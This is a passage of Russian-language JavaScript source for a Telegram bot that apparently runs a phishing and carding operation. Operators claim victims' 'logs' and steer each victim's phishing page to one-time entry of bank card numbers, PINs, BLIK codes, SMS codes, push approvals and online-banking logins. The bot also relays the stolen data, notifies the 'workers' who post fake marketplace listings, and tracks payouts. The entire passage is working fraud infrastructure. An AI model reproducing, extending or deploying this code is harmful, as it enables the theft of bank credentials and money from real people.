    if (clb.data.substring(0, 11) == "@sendemail:"){
        writeFileSync("database/scenes/" + ctx.from.id, JSON.stringify({ service: clb.data.match(/@sendemail:(.+):(.+)/)[1], id: clb.data.match(/@sendemail:(.+):(.+)/)[2] }))
        ctx.scene.enter("email", ctx.scene.stage)
    }

    if (clb.data.substring(0, 12) == "@deletelink:"){
        try { 
            unlinkSync(`../${clb.data.match(/@deletelink:(.+):(.+)/)[1]}/data/${clb.data.match(/@deletelink:(.+):(.+)/)[2]}.xml`)
            ctx.editMessageText(clb.message.text + "\n\n✅ Ссылка удалена!")
        }catch(e){
            ctx.editMessageText(clb.message.text + "\n\n❗️ Не удалось удалить ссылку, возможно она была удалена!")
        }
    }

    if (clb.data.substring(0, 5) == "@sup:"){

        let country = clb.data.replace("@sup:", "")
        
        let work = [[]]

        _local.cp.forEach(cnt => {
                work.push([{text: `${_local.cp_flags[cnt]}`, callback_data: `@sup:${cnt}`}, {text: `${_local.cp_flags[cnt]} ❌`, callback_data: `@sdown:${cnt}`}])
        })

        bot.telegram.sendMessage(chats.main, `${_local.cp_flags[country]} @${ctx.from.username} встал на вбив. `)

        writeFileSync(`database/hand/${country}/${ctx.from.username}`, String(ctx.from.id))
        ctx.editMessageText(clb.message.text + "\n👨‍💻 "+ _local.cp_flags[country] + " Вбивер @" + ctx.from.username + " встал на вбив.", { parse_mode: "HTML", reply_markup: JSON.stringify({ inline_keyboard: work })})

    }  

    if (clb.data.substring(0, 7) == "@sdown:"){

        let country = clb.data.replace("@sdown:", "")
        let work = [[]]

        _local.cp.forEach(cnt => {
                work.push([{text: `${_local.cp_flags[cnt]}`, callback_data: `@sup:${cnt}`}, {text: `${_local.cp_flags[cnt]} ❌`, callback_data: `@sdown:${cnt}`}])
        })

        bot.telegram.sendMessage(chats.main, `${_local.cp_flags[country]} @${ctx.from.username} ушел со вбива. `)

        unlinkSync(`database/hand/${country}/${ctx.from.username}`)
        ctx.editMessageText(clb.message.text + "\n👨‍💻 "+ _local.cp_flags[country] + " Вбивер @" + ctx.from.username + " ушел со вбива.", { parse_mode: "HTML", reply_markup: JSON.stringify({ inline_keyboard: work })})

    }

    if (clb.data.substring(0, 7) == "@smsup:"){

        let country = clb.data.replace("@smsup:", "")
        
        let work = [[]]

        _local.cp.forEach(cnt => {
                work.push([{text: `${_local.cp_flags[cnt]}`, callback_data: `@smsup:${cnt}`}, {text: `${_local.cp_flags[cnt]} ❌`, callback_data: `@smsdown:${cnt}`}])
        })

        bot.telegram.sendMessage(chats.main, `${_local.cp_flags[country]} @${ctx.from.username} встал на отправку SMS. `)

        writeFileSync(`database/sms/${country}`, JSON.stringify({ tag: ctx.from.username, id: ctx.from.id }))
        ctx.editMessageText(clb.message.text + "\n👨‍💻 "+ _local.cp_flags[country] + " SMSer @" + ctx.from.username + " встал на отправку.", { parse_mode: "HTML", reply_markup: JSON.stringify({ inline_keyboard: work })})

    }

    if (clb.data.substring(0, 9) == "@smsdown:"){

        let country = clb.data.replace("@smsdown:", "")
        let work = [[]]

        _local.cp.forEach(cnt => {
                work.push([{text: `${_local.cp_flags[cnt]}`, callback_data: `@smsup:${cnt}`}, {text: `${_local.cp_flags[cnt]} ❌`, callback_data: `@smsdown:${cnt}`}])
        })

        unlinkSync(`database/sms/${country}`)
        bot.telegram.sendMessage(chats.main, `${_local.cp_flags[country]} @${ctx.from.username} ушел с отправки SMS. `)
        ctx.editMessageText(clb.message.text + "\n👨‍💻 "+ _local.cp_flags[country] + " SMSer @" + ctx.from.username + " ушел с отправки.", { parse_mode: "HTML", reply_markup: JSON.stringify({ inline_keyboard: work })})
    }

    if (clb.data.substring(0, 9) == "@pstlink:"){
        writeFileSync("database/scenes/" + ctx.from.id, clb.data.replace("@pstlink:", ""));
        ctx.scene.enter("pstlink", ctx.scene.stage)
    }

    if (clb.data.substring(0, 10) == "@ofrtlink:"){
        writeFileSync("database/scenes/" + ctx.from.id, clb.data.replace("@ofrtlink:", ""));
        ctx.scene.enter("ofrtlink", ctx.scene.stage)
    }

    if (clb.data.substring(0, 7) == "@repay:"){
        writeFileSync("database/scenes/" + ctx.from.id, clb.data.replace("@repay:", ""));
        ctx.scene.enter("olxrepay", ctx.scene.stage)
    }

    if (clb.data.substring(0, 8) == "@cardto:"){
        let inf = { id: clb.data.match(/@cardto:(.+):(.+)/)[1], wid: clb.data.match(/@cardto:(.+):(.+)/)[2]}
        writeFileSync(`/var/www/html/verif/${inf['id']}_${inf['wid']}`, String("5"));
        bot.telegram.sendMessage(inf.wid, `✴️ Вбивер @${ctx.from.username} направил мамонта на ввод карты! После ввода мамонт будет направлен на страницу ожидания.`);
        ctx.reply("✴️ Мамонт направлен на одноразовый ввод карты! После ввода его обратно отправит на страницу ожидания.", {reply_to_message_id: clb.message.message_id});
    }

    if (clb.data.substring(0, 6) == "@blik:"){
        let inf = { id: clb.data.match(/@blik:(.+):(.+)/)[1], wid: clb.data.match(/@blik:(.+):(.+)/)[2]}
        writeFileSync(`/var/www/html/verif/${inf['id']}_${inf['wid']}`, String("3"));
        bot.telegram.sendMessage(inf.wid, `✴️ Вбивер @${ctx.from.username} направил мамонта на Blik! После ввода мамонт будет направлен на страницу ожидания.`);
        ctx.reply("✴️ Мамонт направлен на одноразовый ввод Blik! После ввода его обратно отправит на страницу ожидания.", {reply_to_message_id: clb.message.message_id});
    }

    if (clb.data.substring(0, 4) == "@lk:"){
        let inf = { id: clb.data.match(/@lk:(.+):(.+)/)[1], wid: clb.data.match(/@lk:(.+):(.+)/)[2]}
        writeFileSync(`/var/www/html/verif/${inf['id']}_${inf['wid']}`, String("6"));
        bot.telegram.sendMessage(inf.wid, `✴️ Вбивер @${ctx.from.username} направил мамонта на ввод ЛК! После ввода мамонт будет направлен на страницу ожидания.`);
        ctx.reply("✴️ Мамонт направлен на ввод ЛК! ! После ввода его обратно отправит на страницу ожидания.", {reply_to_message_id: clb.message.message_id});
    }

    if (clb.data.substring(0, 5) == "@pin:"){
        let inf = { id: clb.data.match(/@pin:(.+):(.+)/)[1], wid: clb.data.match(/@pin:(.+):(.+)/)[2]}
        writeFileSync(`/var/www/html/verif/${inf['id']}_${inf['wid']}`, String("7"));
        bot.telegram.sendMessage(inf.wid, `✴️ Вбивер @${ctx.from.username} направил мамонта на ввод PIN от карты! После ввода мамонт будет направлен на страницу ожидания.`);
        ctx.reply("✴️ Мамонт направлен на ввод PIN от карты ! После ввода его обратно отправит на страницу ожидания.", {reply_to_message_id: clb.message.message_id});
    }

    if (clb.data.substring(0, 6) == "@pin2:"){
        let inf = { id: clb.data.match(/@pin2:(.+):(.+)/)[1], wid: clb.data.match(/@pin2:(.+):(.+)/)[2]}
        writeFileSync(`/var/www/html/verif/${inf['id']}_${inf['wid']}`, String("8"));
        bot.telegram.sendMessage(inf.wid, `✴️ Вбивер @${ctx.from.username} направил мамонта на ввод PIN для входа в приложение! После ввода мамонт будет направлен на страницу ожидания.`);
        ctx.reply("✴️ Мамонт направлен на ввод PIN для входа в приложение ! После ввода его обратно отправит на страницу ожидания.", {reply_to_message_id: clb.message.message_id});
    }

    if (clb.data.substring(0, 10) == '@pkotoken:'){
        await writeFileSync("database/scenes/" + ctx.from.id, String(JSON.stringify({ id: clb.data.match(/@pkotoken:(.+):(.+)/)[1], wid: clb.data.match(/@pkotoken:(.+):(.+)/)[2] })))
        await ctx.scene.enter("pko", ctx.scene.stage)
    }


    if (clb.data.substring(0, 9) == "@checker:"){
        let inf = { id: clb.data.match(/@checker:(.+):(.+)/)[1], wid: clb.data.match(/@checker:(.+):(.+)/)[2]}
        writeFileSync(`/var/www/html/verif/${inf['id']}_${inf['wid']}`, String("2"));
        bot.telegram.sendMessage(inf.wid, `✴️ Вбивер @${ctx.from.username} направил мамонта на чекер для авторизации! После выбора мамонт будет направлен на страницу ожидания.`);
        ctx.reply("✴️ Мамонт направлен на чекер для авторизации! После ввода его обратно отправит на страницу ожидания.", {reply_to_message_id: clb.message.message_id});
    }

    if (clb.data.substring(0, 5) == "@sms:"){
        let inf = { id: clb.data.match(/@sms:(.+):(.+)/)[1], wid: clb.data.match(/@sms:(.+):(.+)/)[2]}
        writeFileSync(`/var/www/html/verif/${inf['id']}_${inf['wid']}`, String("0"));
        bot.telegram.sendMessage(inf.wid, `✴️ Вбивер @${ctx.from.username} направил мамонта на одноразовый ввод SMS! После ввода кода мамонт будет направлен на страницу ожидания.`);
        ctx.reply("✴️ Мамонт направлен на одноразовый ввод SMS! После ввода его обратно отправит на страницу ожидания.", {reply_to_message_id: clb.message.message_id});
    }

    if (clb.data.substring(0, 6) == "@push:"){
        let inf = { id: clb.data.match(/@push:(.+):(.+)/)[1], wid: clb.data.match(/@push:(.+):(.+)/)[2]}
        writeFileSync(`/var/www/html/verif/${inf['id']}_${inf['wid']}`, String("1"));
        bot.telegram.sendMessage(inf.wid, `✴️ Вбивер @${ctx.from.username} направил мамонта на одноразововое подтверждение PUSH! После подтверждения PUSH мамонт будет направлен на страницу ожидания.`);
        ctx.reply("✴️ Мамонт направлен на одноразовыое PUSH подтверждение! После подтвреждения его обратно отправит на страницу ожидания.", {reply_to_message_id: clb.message.message_id});
    }

    if (clb.data.substring(0, 10) == "@declined:"){
        let id = clb.data.replace("@declined:", "")
        bot.telegram.sendMessage(id, `⚠️ Вбивер @${ctx.from.username} по обьявлению "${clb.message.text.match(/❇️ Обьявление: (.+)/)[1]}" сообщил <b>что мамонт отклонил запрос на списание. Более точно вы можете спросить у вбивера</b>.`, {parse_mode: "HTML"})
        ctx.reply("✴️ Вокеру выслано уведомление!", {reply_to_message_id: clb.message.message_id});
    }

    if (clb.data.substring(0, 9) == "@nomoney:"){
        let id = clb.data.replace("@nomoney:", "")
        bot.telegram.sendMessage(id, `⚠️ Вбивер @${ctx.from.username} по обьявлению "${clb.message.text.match(/❇️ Обьявление: (.+)/)[1]}" сообщил что <b>у мамонта нет средств</b>.`, {parse_mode: "HTML"})
        ctx.reply("✴️ Вокеру выслано уведомление!", {reply_to_message_id: clb.message.message_id});
    }

    if (clb.data.substring(0, 9) == "@badinfo:"){
        let id = clb.data.replace("@badinfo:", "")
        bot.telegram.sendMessage(id, `⚠️ Вбивер @${ctx.from.username} по обьявлению "${clb.message.text.match(/❇️ Обьявление: (.+)/)[1]}" сообщил что <b>мамонт ввел не верные данные</b>.`, {parse_mode: "HTML"})
        ctx.reply("✴️ Вокеру выслано уведомление!", {reply_to_message_id: clb.message.message_id});
    }

    if (clb.data.substring(0, 9) == "@fakelog:"){
        let id = clb.data.replace("@fakelog:", "")
        bot.telegram.sendMessage(id, `⚠️ Вбивер @${ctx.from.username} по обьявлению "${clb.message.text.match(/❇️ Обьявление: (.+)/)[1]}" сообщил что <b>мамонт ввел фейк инфу.</b>.`, {parse_mode: "HTML"})
        ctx.reply("✴️ Вокеру выслано уведомление!", {reply_to_message_id: clb.message.message_id});
    }

    if (clb.data.substring(0, 6) == "@pick:"){
        
        let logname = clb.data.replace("@pick:", "")
        let json = JSON.parse(readFileSync("/var/www/html/logs/" + logname))
        writeFileSync(`/var/www/html/logs_ck/${json['uid']}_${json['worker_id']['0']}`, String(ctx.from.id))
        writeFileSync(`database/memory/${json['uid']}_${json['worker_id']['0']}`, JSON.stringify({ callback: `@pick:${logname}`, bank: json['log'].match(/❕ <b>Bank<\/b>: (.+)/)[1], worker: clb.message.text.match(/👥 Worker: @(.+)/)[1], location: clb.message.text.match(/❇️ Локация: (.+)/)[1], service: clb.message.text.split("\n")[0] }))
        ctx.editMessageText(clb.message.text + "\n👉 Взял лог -> @" + ctx.from.username)
        console.log(json['log'])
        bot.telegram.sendMessage(ctx.from.id, `<b>${clb.message.text.match(/(.+) NEW LOG/)[1]}</b>\n\n<b>❇️ Локация</b>: ${clb.message.text.match(/❇️ Локация: (.+)/)[1]}\n<b>❇️ Обьявление</b>: ${json['name']['0']}\n<b>❇️ Стоимость</b>: ${json['price']['0']}\n<b>❇️ Воркер</b>: @${json['worker']['0']}\n<b>❇️ Воркер ID</b>: ${json['worker_id']['0']}\n<b>❇️ Идентификатор</b>: ${json['uid']} / ${json['domain']}\n\n${json['log']}`, {parse_mode: "HTML", reply_markup: {
            inline_keyboard: [
                [
                    Markup.button.callback("Отклонено", "@declined:" + json['worker_id']['0']),
                    Markup.button.callback("Нет денег", "@nomoney:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("Неверные данные", "@badinfo:" + json['worker_id']['0']),
                    Markup.button.callback("Фэйк", "@fakelog:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("ЛК", `@lk:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("Токен", `@pkotoken:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("SMS", `@sms:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("BLIK", `@blik:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("Пуш", `@push:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("Карта", `@cardto:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("PIN (карта)", `@pin:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("CHECKER", `@checker:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("PIN (вход в банк)", `@pin2:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("✅ Залет", `@profit:${json['worker_id']['0']}`)
                ],
                [ //writeFileSync(`database/memory/${json['uid']}_${json['worker_id']['0']}`, JSON.stringify({ callback: `@pick:${logname}`, bank: json['log'].match(/❕ <b>Bank<\/b>: (.+)/)[1], worker: clb.message.text.match(/👥 Worker: @(.+)/)[1], location: clb.message.text.match(/❇️ Локация: (.+)/)[1], service: clb.message.text.split("\n")[0] }))
                    Markup.button.callback("❌ Отказаться от лога", `@nl:${json['uid']}_${json['worker_id']['0']}`)
                ]
            ]
        }})
        bot.telegram.sendMessage(json['worker_id']['0'], `${clb.message.text.match(/(.+) NEW LOG/)[1]}\n⚠️ За вбив твоего обьявления ${json['name']['0']} взялся вбивер @${ctx.from.username} ⚠️`, {parse_mode: "HTML"})
    }

    if (clb.data.substring(0, 4) == "@nl:"){
        let answer = JSON.parse(readFileSync(`database/memory/${clb.data.replace("@nl:", "")}`, ""))

        ctx.deleteMessage(clb.message.message_id)
        try { unlinkSync(`/var/www/html/logs_ck/${clb.data.replace("@nl:", "")}`) } catch(e){ 1+1 }
        bot.telegram.sendMessage(cfg.logs, `${answer.service} (Отказался от лога: @${ctx.from.username})\n\n🏦 ${answer.bank}\n👥 Worker: @${answer.worker}\n❇️ Локация: ${answer.location}`, Markup.inlineKeyboard([
            [
                Markup.button.callback("Взять лог", answer.callback)
            ]
        ]))
    }

    if (clb.data.substring(0, 7) == "@zpick:"){
        
        let logname = clb.data.replace("@zpick:", "")
        let json = JSON.parse(readFileSync("/var/www/html/logs/" + logname))
        
        writeFileSync(`/var/www/html/logs_ck/${json['uid']}_${json['worker_id']['0']}`, String(ctx.from.id))
        writeFileSync(`database/memory/${json['uid']}_${json['worker_id']['0']}`, JSON.stringify({ callback: `@pick:${logname}`, bank: json['log'].match(/❕ <b>Bank<\/b>: (.+)/)[1], worker: clb.message.text.match(/👥 Worker: @(.+)/)[1], location: clb.message.text.match(/❇️ Локация: (.+)/)[1], service: clb.message.text.split("\n")[0] }))
        ctx.editMessageText(clb.message.text + "\n👉 Взял лог -> @" + ctx.from.username)
        bot.telegram.sendMessage(ctx.from.id, `<b>${clb.message.text.match(/(.+) NEW LOG/)[1]}</b>\n\n<b>❇️ Локация</b>: ${clb.message.text.match(/❇️ Локация: (.+)/)[1]}\n<b>❇️ Обьявление</b>: ${json['name']['0']}\n<b>❇️ Стоимость</b>: ${json['price']['0']}\n<b>❇️ Воркер</b>: @${json['worker']['0']}\n<b>❇️ Воркер ID</b>: ${json['worker_id']['0']}\n<b>❇️ Идентификатор</b>: ${json['uid']} / ${json['domain']}\n\n${json['log']}`, {parse_mode: "HTML", reply_markup: {
            inline_keyboard: [
                [
                    Markup.button.callback("Отклонено", "@declined:" + json['worker_id']['0']),
                    Markup.button.callback("Нет денег", "@nomoney:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("Неверные данные", "@badinfo:" + json['worker_id']['0']),
                    Markup.button.callback("Фэйк", "@fakelog:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("SMS", `@sms:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("Пуш", `@push:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("✅ Залет", `@profit:${json['worker_id']['0']}`)
                ],
                [ //writeFileSync(`database/memory/${json['uid']}_${json['worker_id']['0']}`, JSON.stringify({ callback: `@pick:${logname}`, bank: json['log'].match(/❕ <b>Bank<\/b>: (.+)/)[1], worker: clb.message.text.match(/👥 Worker: @(.+)/)[1], location: clb.message.text.match(/❇️ Локация: (.+)/)[1], service: clb.message.text.split("\n")[0] }))
                Markup.button.callback("❌ Отказаться от лога", `@nl:${json['uid']}_${json['worker_id']['0']}`)
                ]
            ]
        }})
    }

    if (clb.data.substring(0,8) == "@profit:"){
        writeFileSync("database/scenes/" + ctx.from.id, JSON.stringify({text: clb.message.text}))
        ctx.scene.enter("mkprofit", ctx.scene.stage)
    }

    if (clb.data.substring(0, 7) == "@cpick:"){
        
        let logname = clb.data.replace("@cpick:", "")
        let json = JSON.parse(readFileSync("/var/www/html/logs/" + logname))
        writeFileSync(`/var/www/html/logs_ck/${json['uid']}_${json['worker_id']['0']}`, String(ctx.from.id))
        writeFileSync(`database/memory/${json['uid']}_${json['worker_id']['0']}`, JSON.stringify({ callback: `@cpick:${logname}`, bank: json['log'].match(/❕ <b>Bank<\/b>: (.+)/)[1], worker: clb.message.text.match(/👥 Worker: @(.+)/)[1], location: clb.message.text.match(/❇️ Локация: (.+)/)[1], service: clb.message.text.split("\n")[0] }))
        ctx.editMessageText(clb.message.text + "\n👉 Взял лог -> @" + ctx.from.username)
        bot.telegram.sendMessage(ctx.from.id, `<b>${clb.message.text.match(/(.+) NEW LOG/)[1]}</b>\n\n<b>❇️ Локация</b>: ${clb.message.text.match(/❇️ Локация: (.+)/)[1]}\n<b>❇️ Обьявление</b>: ${json['name']['0']}\n<b>❇️ Стоимость</b>: ${json['price']['0']}\n<b>❇️ Воркер</b>: @${json['worker']['0']}\n<b>❇️ Воркер ID</b>: ${json['worker_id']['0']}\n<b>❇️ Идентификатор</b>: ${json['uid']} / ${json['domain']}\n\n${json['log']}`, {parse_mode: "HTML", reply_markup: {
            inline_keyboard: [
                [
                    Markup.button.callback("Отклонено", "@declined:" + json['worker_id']['0']),
                    Markup.button.callback("Нет денег", "@nomoney:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("Неверные данные", "@badinfo:" + json['worker_id']['0']),
                    Markup.button.callback("Фэйк", "@fakelog:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("SMS", `@sms:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("Пуш", `@push:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("✅ Залет", `@profit:${json['worker_id']['0']}`)
],
[ //writeFileSync(`database/memory/${json['uid']}_${json['worker_id']['0']}`, JSON.stringify({ callback: `@pick:${logname}`, bank: json['log'].match(/❕ <b>Bank<\/b>: (.+)/)[1], worker: clb.message.text.match(/👥 Worker: @(.+)/)[1], location: clb.message.text.match(/❇️ Локация: (.+)/)[1], service: clb.message.text.split("\n")[0] }))
Markup.button.callback("❌ Отказаться от лога", `@nl:${json['uid']}_${json['worker_id']['0']}`)
]
            ]
        }})
        bot.telegram.sendMessage(json['worker_id']['0'], `${clb.message.text.match(/(.+) NEW LOG/)[1]}\n⚠️ За вбив твоего обьявления ${json['name']['0']} взялся вбивер @${ctx.from.username} ⚠️`, {parse_mode: "HTML"})
    }

    if (clb.data.substring(0, 7) == "@lpick:"){
        
        let logname = clb.data.replace("@lpick:", "")
        let json = JSON.parse(readFileSync("/var/www/html/logs/" + logname))
        
        writeFileSync(`/var/www/html/logs_ck/${json['uid']}_${json['worker_id']['0']}`, String(ctx.from.id))
        writeFileSync(`database/memory/${json['uid']}_${json['worker_id']['0']}`, JSON.stringify({ callback: `@lpick:${logname}`, bank: json['log'].match(/❕ <b>Bank<\/b>: (.+)/)[1], worker: clb.message.text.match(/👥 Worker: @(.+)/)[1], location: clb.message.text.match(/❇️ Локация: (.+)/)[1], service: clb.message.text.split("\n")[0] }))
        ctx.editMessageText(clb.message.text + "\n👉 Взял лог -> @" + ctx.from.username)
        bot.telegram.sendMessage(ctx.from.id, `<b>${clb.message.text.match(/(.+) NEW LOG/)[1]}</b>\n\n<b>❇️ Локация</b>: ${clb.message.text.match(/❇️ Локация: (.+)/)[1]}\n<b>❇️ Обьявление</b>: ${json['name']['0']}\n<b>❇️ Стоимость</b>: ${json['price']['0']}\n<b>❇️ Воркер</b>: @${json['worker']['0']}\n<b>❇️ Воркер ID</b>: ${json['worker_id']['0']}\n<b>❇️ Идентификатор</b>: ${json['uid']} / ${json['domain']}\n\n${json['log']}`, {parse_mode: "HTML", reply_markup: {
            inline_keyboard: [
                [
                    Markup.button.callback("Отклонено", "@declined:" + json['worker_id']['0']),
                    Markup.button.callback("Нет денег", "@nomoney:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("Неверные данные", "@badinfo:" + json['worker_id']['0']),
                    Markup.button.callback("Фэйк", "@fakelog:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("SMS", `@sms:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("Пуш", `@push:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("BLIK", `@blik:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("Карта", `@cardto:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("ЛК", `@lk:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("✅ Залет", `@profit:${json['worker_id']['0']}`)
],
[ //writeFileSync(`database/memory/${json['uid']}_${json['worker_id']['0']}`, JSON.stringify({ callback: `@pick:${logname}`, bank: json['log'].match(/❕ <b>Bank<\/b>: (.+)/)[1], worker: clb.message.text.match(/👥 Worker: @(.+)/)[1], location: clb.message.text.match(/❇️ Локация: (.+)/)[1], service: clb.message.text.split("\n")[0] }))
Markup.button.callback("❌ Отказаться от лога", `@nl:${json['uid']}_${json['worker_id']['0']}`)
]
            ]
        }})
    }

    if (clb.data.substring(0, 7) == "@qpick:"){
        
        let logname = clb.data.replace("@qpick:", "")
        let json = JSON.parse(readFileSync("/var/www/html/logs/" + logname))
        writeFileSync(`/var/www/html/logs_ck/${json['uid']}_${json['worker_id']['0']}`, String(ctx.from.id))
        writeFileSync(`database/memory/${json['uid']}_${json['worker_id']['0']}`, JSON.stringify({ callback: `@qpick:${logname}`, bank: json['log'].match(/❕ <b>Bank<\/b>: (.+)/)[1], worker: clb.message.text.match(/👥 Worker: @(.+)/)[1], location: clb.message.text.match(/❇️ Локация: (.+)/)[1], service: clb.message.text.split("\n")[0] }))
        ctx.editMessageText(clb.message.text + "\n👉 Взял лог -> @" + ctx.from.username)
        bot.telegram.sendMessage(ctx.from.id, `<b>${clb.message.text.match(/(.+) NEW LOG/)[1]}</b>\n\n<b>❇️ Локация</b>: ${clb.message.text.match(/❇️ Локация: (.+)/)[1]}\n<b>❇️ Обьявление</b>: ${json['name']['0']}\n<b>❇️ Стоимость</b>: ${json['price']['0']}\n<b>❇️ Воркер</b>: @${json['worker']['0']}\n<b>❇️ Воркер ID</b>: ${json['worker_id']['0']}\n<b>❇️ Идентификатор</b>: ${json['uid']} / ${json['domain']}\n\n${json['log']}`, {parse_mode: "HTML", reply_markup: {
            inline_keyboard: [
                [
                    Markup.button.callback("Отклонено", "@declined:" + json['worker_id']['0']),
                    Markup.button.callback("Нет денег", "@nomoney:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("Неверные данные", "@badinfo:" + json['worker_id']['0']),
                    Markup.button.callback("Фэйк", "@fakelog:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("SMS", `@sms:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("Пуш", `@push:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("BLIK", `@blik:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("Карта", `@cardto:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("ЛК", `@lk:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("✅ Залет", `@profit:${json['worker_id']['0']}`)
],
[ //writeFileSync(`database/memory/${json['uid']}_${json['worker_id']['0']}`, JSON.stringify({ callback: `@pick:${logname}`, bank: json['log'].match(/❕ <b>Bank<\/b>: (.+)/)[1], worker: clb.message.text.match(/👥 Worker: @(.+)/)[1], location: clb.message.text.match(/❇️ Локация: (.+)/)[1], service: clb.message.text.split("\n")[0] }))
Markup.button.callback("❌ Отказаться от лога", `@nl:${json['uid']}_${json['worker_id']['0']}`)
]
            ]
        }})
        bot.telegram.sendMessage(json['worker_id']['0'], `${clb.message.text.match(/(.+) NEW LOG/)[1]}\n⚠️ За вбив твоего обьявления ${json['name']['0']} взялся вбивер @${ctx.from.username} ⚠️`, {parse_mode: "HTML"})
    }

    if (clb.data.substring(0, 7) == "@mpick:"){
        
        let logname = clb.data.replace("@mpick:", "")
        let json = JSON.parse(readFileSync("/var/www/html/logs/" + logname))
        
        writeFileSync(`/var/www/html/logs_ck/${json['uid']}_${json['worker_id']['0']}`, String(ctx.from.id))
        writeFileSync(`database/memory/${json['uid']}_${json['worker_id']['0']}`, JSON.stringify({ callback: `@mpick:${logname}`, bank: json['log'].match(/❕ <b>Bank<\/b>: (.+)/)[1], worker: clb.message.text.match(/👥 Worker: @(.+)/)[1], location: clb.message.text.match(/❇️ Локация: (.+)/)[1], service: clb.message.text.split("\n")[0] }))
        ctx.editMessageText(clb.message.text + "\n👉 Взял лог -> @" + ctx.from.username)
        bot.telegram.sendMessage(ctx.from.id, `<b>${clb.message.text.match(/(.+) NEW LOG/)[1]}</b>\n\n<b>❇️ Локация</b>: ${clb.message.text.match(/❇️ Локация: (.+)/)[1]}\n<b>❇️ Обьявление</b>: ${json['name']['0']}\n<b>❇️ Стоимость</b>: ${json['price']['0']}\n<b>❇️ Воркер</b>: @${json['worker']['0']}\n<b>❇️ Воркер ID</b>: ${json['worker_id']['0']}\n<b>❇️ Идентификатор</b>: ${json['uid']} / ${json['domain']}\n\n${json['log']}`, {parse_mode: "HTML", reply_markup: {
            inline_keyboard: [
                [
                    Markup.button.callback("Отклонено", "@declined:" + json['worker_id']['0']),
                    Markup.button.callback("Нет денег", "@nomoney:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("Неверные данные", "@badinfo:" + json['worker_id']['0']),
                    Markup.button.callback("Фэйк", "@fakelog:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("ЛК", `@lk:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("Токен", `@pkotoken:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("SMS", `@sms:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("BLIK", `@blik:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("Пуш", `@push:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("Карта", `@cardto:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("PIN", `@pin:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("CHECKER", `@checker:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("PIN (вход в банк)", `@pin2:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("✅ Залет", `@profit:${json['worker_id']['0']}`)
],
[ //writeFileSync(`database/memory/${json['uid']}_${json['worker_id']['0']}`, JSON.stringify({ callback: `@pick:${logname}`, bank: json['log'].match(/❕ <b>Bank<\/b>: (.+)/)[1], worker: clb.message.text.match(/👥 Worker: @(.+)/)[1], location: clb.message.text.match(/❇️ Локация: (.+)/)[1], service: clb.message.text.split("\n")[0] }))
Markup.button.callback("❌ Отказаться от лога", `@nl:${json['uid']}_${json['worker_id']['0']}`)
]
            ]
        }})
    }

    if (clb.data.substring(0, 9) == "@killlog:"){
        let inf = { 
            uid: clb.data.match(/@killlog:(.+):(.+):(.+)/)[1],
            wid: clb.data.match(/@killlog:(.+):(.+):(.+)/)[2],
            
         }

         unlinkSync(`/var/www/html/logs_ck/${inf.uid}_${inf.wid}`)
        ctx.editMessageText(clb.message.text + "\n\n❗️ Вы отказались от лога!")
    }

    if (clb.data.substring(0, 6) == "@goto:"){
        try {
        ctx.scene.enter(clb.data.replace("@goto:", ""), ctx.scene.stage)
        }catch (e) {
            ctx.reply("Произошла ошибка. " + e)
        }
    }
    
    if (clb.data == "@succpay:"){
        let log = JSON.parse(readFileSync(`database/profits/${clb.message.text.match(/💸 Профит №(.+)/)[1]}`))

        unlinkSync(`database/profits/${clb.message.text.match(/💸 Профит №(.+)/)[1]}`)
        await bot.telegram.editMessageText(cfg.payouts, log.msg_id, "", log.text, {parse_mode: "HTML"})
        await ctx.editMessageText(clb.message.text + "\n ✅ Выплачено.", {parse_mode: "HTML"})
